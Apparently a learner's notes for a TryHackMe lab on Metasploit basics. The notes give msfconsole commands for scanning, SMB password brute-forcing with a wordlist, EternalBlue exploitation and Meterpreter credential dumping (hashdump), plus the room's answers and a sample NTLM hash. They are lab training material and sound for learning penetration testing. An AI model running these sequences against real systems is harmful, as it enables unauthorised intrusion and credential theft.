# Metasploit: Exploitation Basics
Use Metasploit for scanning, vulnerability assessment and exploitation.

## Content:
[Task 1: Introduction](#task-1-introduction)
<br>[Task 2: Scanning](#task-2-scanning)
<br>[Task 3: Metasploit Database](#task-3-metasploit-database)
<br>[Task 4: Vulnerability Scanning](#task-4-vulnerability-scanning)
<br>[Task 5: Exploitation](#task-5-exploitation)
<br>[Task 6: Msfvenom](#task-6-msfvenom)
<br>[To note](#to-note)

## Task 1: Introduction
| Term | Description |
|------|-------------|
| Metasploit usage| To scan target systems and to conduct vulnerability scan. |
| Database feature | To manage pentration testing engagements with a broader scope. |
| msfvenom | To generate payloads and start Meterpreter session on target system. |

To note:
<ul>
<li>TryHackMe - For attacks that require wordlist: <code>/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt</code></li>
<li>To run Metasploit: <code>msfconsole</code></li>
</ul>

## Task 2: Scanning
<ol>
<li>Port Scanning</li>
<li>UDP service Identification</li>
<li>SMB Scans</li>
<li>Other scans</li>
<li>THM Questions</li>
</ol>

<u><b>Port Scanning</b></u>
<br>Metasploit has several modules to scan open ports on target system and network.
| Term | Description |
|------|-------------|
| To list potential port scanning modules available. | Command line: ` search portscan`<br>Need to set a few options (`show options`):<ul><li><b>CONCURRENCY:</b> No. of targets to be scanned simultaneously.</li><li><b>PORTS:</b> Port range to be scanned. To note: Nmap '1-1000' scans the 1000 most used ports. Metasploit '1-1000' scans port numbers from 1 to 10000.</li><li><b>RHOSTS:</b> Target or target network to be scanned.</li><li><b>THREADS:</b> No. of threads used to simultaneously. More threads, faster scans.</li></ul> |
|To perform Nmap scans from msfconsole directly. | Command line: `nmap -sS 10.10.12.229 `<br>Nmap is a network discovery and security-auditing tool; use it to find hosts and services on a network, discover open ports, identify running services/ versions, detect OSes and run scripted checks (E.g. vulnerability or info-gathering scripts.) |

<u><b>UDP service Identification</b></u>
<br>Module: `scanner/discovery/udp_sweep` quickly identifies services running over UDP. Will not conduct an extensive scan of all possible UDP services but provides a quick way to idnetify services such as DNS or NetBIOS.

| Command | Action |
|---------|---------|
| `use auxiliary/scanner/discovery/udp_sweep`<br>`run` | To run UDB service identification scan. |

<u><b>SMB Scans</b></u>
<br>Metasploit offers several auxiliary modules to scan specific services, for e.g. SMB. Modules: `smb_enumshares` and `smb_version` - Useful for corporate network.

<u><b>Other scans</b></u>
<ul><li><b>NetBIOS (Network Basic Input Output System):</b> Similar to SMB; allows computers to communicate over network to share files or send files to printer. NetBIOS name of target system can give idea of its role/ importance (E.g. CORP-DC, DEVOPS, SALES.). May also come across shared files and folders that can be accessedd without password or protected with simple password (E.g. admin, administrator, root, toor.).</li>
<li>Metasploit has many modules to help you better understadn target system and find vulnerabilities. Worth performing quick search to see if any modules can be helpful based on target system.</li>
</ul>

<u><b>THM Questions</b></u>
| Question | Answer |
|---------|---------|
| How many ports are open on the target system? | `msfconsole`<br><br>`nmap -sS <target_machine_IP>`<br>`nmap -sS 10.10.38.182`<br><br>or<br><br>`search portscan`<br>`use use auxiliary/scanner/portscan/tcp`<br>`show options`<br>`set rhost 10.10.38.182`<br>`run` |
| Using the relevant scanner, what NetBIOS name can you see? | `search netbios`<br>`use auxiliary/scanner/netbios/nbname`<br>`set RHOSTS 10.10.38.18`|
| What is running on port 8000?<br><ul><li>Port 8000 used for web servers and HTTP-based applications, so research HTTP version modules in Metasploit.</li></ul> | `back`<br>`search http_version`<br>`use 0`<br>`show options`<br>`set rhost 10.10.38.182`<br>`set rport 8000`<br>`run` |
| What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task. | `back`<br>`search smb_login`<br>`use 0`<br>`set rhost 10.10.38.182`<br>`set smbuser penny`<br>`set pass_file /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`<br>`run` |

## Task 3: Metasploit Database
<ul>
<li>Interact with single target: Don't need database.</li>
<li>Actual penetration engagement has several targets: Database used to simplify project management and avoid confusion when setting up paramenter values.</li>
</ul>

| Action | Command |
|--------|---------|
|  <ol><li>For THM Attackbox: Database has alr been created, so need to delete first if want to perform the rest of the steps.</li><li>Start the PostgreSQL database.</li><li>Initialize the Metasploit database, as non-root user (Otherwise, get error.).</li><li>Launch Metasploit.</li><li>Check database status.</li></ol> | <ol><li>`sudo -u postgres msfdb delete`</li><li>`systemctl start postgresql`</li><li>`sudo -u postgres msfdb init`</li><li>`msfconsole`</li><li>`db_status`</li> |
| <ul><li>List available workspaces.</li><li>Add workspace.</li><li>Delete workspace.</li><li>Switch workspace.</li><li>List available options for `workspace`.</li></ul> | <ul><li>`workspace -1` or `workspace -v`</li><li>`workspace -a tryhackme`</li><li>`workspace -d tryhackme`</li><li>`workspace <workspace_name>`</li><li>`workspace -h`</li></ul> |
| Once Metasploit launched with database, `help` will show Database Backends Commands menu. Different from regulat Metasploit usage. | `help` |
| <ul><li>Run Nmap scan using `db_nmap`, all results will be saved to database.</li><li>Can now reach info relevant to hosts and services running on target systems.</li><li>Help menus for hosts and services.</li><li>Add values to RHOSTS parameter.</li></ul> | <ul><li>`hosts` or `services`</li><li>`hosts -h` or `services -h`</li><li>`hosts -R`</li></ul> |
|Search for specific services in environment.<br>Might want to look for low-hanging fruits such as:<ul><li><b>HTTP:</b> Could potentially host web application where can find vulnerabilities such as SQL injection or RCE.</li><li><b>FTP:</b> Could allow anonymous login and provide access to interesting files.</li><li><b>SMB:</b> Could be vulnerable to SMB exploits like MS17-010.<li><b>SSH:</b> Could have default/ easy-to-guess creds.</li><li><b>RDP:</b> Could be vulnerable to Bluekeep or allow desktop access if weak creds were used.</li></ul> | `services -S netbios` |

<u><b>Workflow</b></u>
<ol>
<li>Find available hosts with `db_nmap`.</li>
<li>Scan these hosts for further vulnerability by using vulnerability scanning module that finds potential MS17-010 vulnerabilities with <code>use auxiliary/scanner/smb/smb_ms17_010</code>.</li>
<li>Set RHOSTS value with <code>hosts -R</code>.</li>
<li>Run exploit with <code>run</code> or <code>exploit</code>.
</ol>

## Task 4: Vulnerability Scanning
<ul>
<li>Metasplot allows quick identification of some critical vulnerabilities that are considered to be low-hanging fruits.</li>
<li>Low-hanging fruits =  easily identifiable and exploitable vulnerabilities that can gain foothold on a system and might gain high-level privileges such as root/ administrator.</li>
<li>Find vulnerabilities using Metasploit will rely heavily on your ability to scan and fingerprint target.</li>
</ul>

<u><b>Workflow</b></u>
<ol>
<li>Identify VNC service running on target, so use <code>search</code> to list useful modules. Results will contain payload and post modules, which are not v useful as haven't discovered potential exploit to use.</li>
<li>But in case of VNC, can use several scanner modules. List scanner modules with <code>use auxiliary/scanner/vnc/</code>.</li>
<li>Use vnc_login module with <code>use auxiliary/scanner/vnc/vnc_login</code>.</li>
<li>Have better understanding of module and its purpose with <code>info</code>. Realize that vnc_login module can help us find login details for VNC service.</li>
</ol>

## Task 5: Exploitation
Metasploit is an exploitation framework. For successful outcome, need to have thorough understanding of services running on target system.

| Action | Command |
|--------|---------|
| <ol><li>Search for exploits.</li><li>Obtain more info about exploit.</li><li>Launch exploit.</li></ol> | <ol><li>`search`</li><li>`info`</li><li>`exploit` or `run`</li></ol> |
| Most exploits have preset default payload. But there are other commands for (selected) exploit. | `show payloads` |
| Set payload of choice.<br>To note: Choosing working payload is a trial-and-error process because of environmental/ OS restrictions such as firewall rules, AV, file writing or program performing payload execution isn't available (E.g. payload/python/shell_reverse_tcp. | `set payload <payload_name/ payload_number>` |
| <ol><li>List required parameters.</li><li>Set parameter values.</li></ol> | <ol><li>`show options`</li><li>`set lhost 10.10.186.44`</li></ol> |
| Once session is opened, can <ul><li>background</li><li>abort it.</li></ul>Background session useful when working on more than one target simultaneously or same target with different exploit/ shell. | <ul><li>`CTRL+Z`</li><li>`CTRL+C`</li></ul> |
| <u><b>Working with sessions</b></u><ul><li>List all active sessions.</li><li>List session help menu.</li><li>Interact with existing session.</li></ul>  | <ul><li>`sessions`</li><li>`sessions -h`</li><li>`sessions -i <session_ID>`</li></ul> |

<u><b>THM Questions</b></u>
| Question | Answer |
|---------|---------|
| Exploit one of the critical vulnerabilities on the target VM. | [Command prompt]<br>`msfconsole`<br><br>[msfconsole prompt]<br>`search type:exploit eternalblue`<br>`use exploit/windows/smb/ms17_010_eternalblue`<br>`show options`<br>`set rhost 10.201.117.227`<br>`run` |
| What is the content of the flag.txt file? | [Meterpreter prompt]<br>`help`<br>`search -f flag.txt`: Search by file name.<br>`cat "c:\Users\Jon\Documents\flag.txt"` or `cat /Users/Jon/Documents/flag.txt` |
| What is the NTLM hash of the password of the user "pirate"? | [Meterpreter prompt]<br>`help`<br>`hashdump` |

<b>Windows SAM / pwdump-style account record:</b> pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::
<ul>
<li><b>pirate:</b> Username</li>
<li><b>1001:</b> User identifier (RID/UID)</li>
<li><b>aad3b435b51404eeaad3b435b51404ee:</b> LM hash (this specific value is the well-known empty/disabled LM value).</li>
<li><b>8ce9a3ebd1647fcc5e04025019f4b875:</b> NT (NTLM) hash (32 hex characters).</li>
<li><b>Remaining <code>:::</code>:</b> Empty fields (comment/home/shell equivalents in this export format)</li>
</ul>

## Task 6: Msfvenom
## To note
<ul>
<li>[Meterpreter prompt] When using file path with `cat`, need quotation marks around file path to treat file path as one token.</li>
<li>`dir`: List files on remote/target machine. `ldir`: List files on your local machine; the host runnign msfconsole/ Meterpreter client/ attacking machine.</li>
</ul>
